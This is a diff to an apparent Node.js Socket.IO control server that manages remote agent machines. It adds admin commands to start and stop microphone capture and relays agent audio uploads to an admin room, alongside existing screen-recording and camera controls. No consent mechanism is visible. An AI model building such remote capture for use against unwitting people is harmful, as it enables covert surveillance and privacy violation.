@@ -774,7 +774,8 @@ io.on('connection', (socket) => {
             machine: machineName,
             id: socket.id,
             recording: false,
-            cameraOn: false
+            cameraOn: false,
+            voiceRecording: false
         };
         console.log(`[agent] registered: ${machineName} (${socket.id})`);
         emitAgentList();
@@ -788,12 +789,14 @@ io.on('connection', (socket) => {
         const previous = agents[socket.id] || { id: socket.id, machine: data.machine || 'Unknown-PC' };
         const hasRecording = typeof data.recording === 'boolean';
         const hasCameraOn = typeof data.cameraOn === 'boolean';
+        const hasVoiceRecording = typeof data.voiceRecording === 'boolean';
 
         agents[socket.id] = {
             ...previous,
             machine: data.machine || previous.machine,
             recording: hasRecording ? data.recording : Boolean(previous.recording),
             cameraOn: hasCameraOn ? data.cameraOn : Boolean(previous.cameraOn),
+            voiceRecording: hasVoiceRecording ? data.voiceRecording : Boolean(previous.voiceRecording),
             lastStateAt: Date.now()
         };
 
@@ -803,6 +806,7 @@ io.on('connection', (socket) => {
             machine: agents[socket.id].machine,
             recording: agents[socket.id].recording,
             cameraOn: agents[socket.id].cameraOn,
+            voiceRecording: agents[socket.id].voiceRecording,
             source: data.source || 'agent'
         });
     });
@@ -854,6 +858,22 @@ io.on('connection', (socket) => {
         emitControlAck('stop_camera', result);
     });
 
+    socket.on('admin_start_voice', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('start_voice_capture', payload);
+        emitControlAck('start_voice_capture', result);
+    });
+
+    socket.on('admin_stop_voice', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('stop_voice_capture', payload);
+        emitControlAck('stop_voice_capture', result);
+    });
+
     // Relay Camera Frames from Agent to Dashboard
     socket.on('camera_frame', (data) => {
         if (isAdmin) {
@@ -876,6 +896,21 @@ io.on('connection', (socket) => {
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
         io.to(ADMIN_ROOM).emit('new_video_link', {
             ...data,
+            mediaType: data?.mediaType || 'video',
+            agentId: socket.id,
+            machine: data?.machine || agent.machine
+        });
+    });
+
+    socket.on('audio_upload_complete', (data) => {
+        if (isAdmin) {
+            return;
+        }
+
+        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        io.to(ADMIN_ROOM).emit('new_video_link', {
+            ...data,
+            mediaType: 'audio',
             agentId: socket.id,
             machine: data?.machine || agent.machine
         });
@@ -921,6 +956,7 @@ io.on('connection', (socket) => {
             online: false,
             recording: false,
             cameraOn: false,
+            voiceRecording: false,
             source: 'disconnect'
         });
     });
